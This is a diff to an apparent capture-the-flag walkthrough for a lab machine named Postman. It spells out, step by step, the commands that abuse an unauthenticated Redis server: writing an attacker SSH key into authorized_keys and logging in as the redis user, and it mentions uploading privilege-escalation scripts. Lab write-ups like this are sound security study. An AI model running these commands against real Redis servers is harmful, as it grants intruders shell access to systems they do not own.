@@ -9,6 +9,8 @@ Vulnerabilities
 * redis
 * webmin
 
+<!--
+
 Required tools
 * nmap
 * burpsuite
@@ -19,6 +21,15 @@ Other tools
 * redis-cli
 * exiftool https://exiftool.org
 * gobuster https://github.com/OJ/gobuster
+
+Other commands
+```
+find . -writable -ls
+find . -readable -ls
+strings
+```
+
+-->
 
 ## Walkthrough
 
@@ -55,17 +66,19 @@ echo "PING" | nc 10.10.10.160 6379
 http --verify=no https://10.10.10.160:10000
 ```
 
-Redis [unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)
+Redis
+* [Redis post-exploitation](https://github.com/niqdev/strawhatsec/blob/main/gitbook/htb/linux/15-redis-post-exploitation.pdf)
+* [Unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)
 ```bash
+# install client
+apt install -y redis
+echo "PING" | redis-cli -h 10.10.10.160
+
 # generate key pair
 ssh-keygen -N "" -f ~/.ssh/postman
 
 # important append \n\n before and after the pub key
 (echo -e "\n\n"; cat ~/.ssh/postman.pub; echo -e "\n\n") > ~/.ssh/postman.txt
-
-# install client
-apt install -y redis
-redis-cli -h 10.10.10.160
 
 # create fake redis key/value (without `save` it's lost)
 cat ~/.ssh/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman
@@ -73,21 +86,21 @@ cat ~/.ssh/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman
 # continue the commands and save
 nc -v 10.10.10.160 6379
 # verify key content - without \n\n the content is corrupted
-get ssh-postman
+GET ssh-postman
 # create backup directory
-config set dir /var/lib/redis/.ssh
+CONFIG set dir /var/lib/redis/.ssh
 # create backup db
-config set dbfilename authorized_keys
+CONFIG set dbfilename authorized_keys
 # save and exit
-save
+SAVE
 
 # private key permissions
 chmod 600 ~/.ssh/postman
 # access to instance "redis@Postman"
-ssh -i ~/.ssh/postman redis@10.10.10.160
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/postman redis@10.10.10.160
 ```
 
---- TODO review
+### Lateral Movement
 
 Upload privesc scripts from lab
 ```bash
